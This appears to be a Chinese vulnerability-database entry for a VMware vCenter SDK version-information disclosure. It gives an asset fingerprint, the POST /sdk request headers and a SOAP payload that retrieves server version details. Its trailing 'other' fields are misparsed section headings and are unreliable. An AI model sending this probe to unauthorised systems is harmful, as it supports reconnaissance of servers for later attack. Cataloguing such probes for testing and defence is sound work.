# VMwarevCentersdk存在版本信息泄露漏洞

- **系统**：VMwarevCentersdk　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`title="ID_VC_Welcome"`
- **请求**：`POST /sdk HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 579`

**请求体 / payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<soap:Header>
<operationID>00000001-00000001</operationID>
</soap:Header>
<soap:Body>
<RetrieveServiceContent
xmlns="urn:internalvim25">
<_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this>
</RetrieveServiceContent>
</soap:Body>
</soap:Envelope>
```

**其他**
- 版本: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * VMware vCenter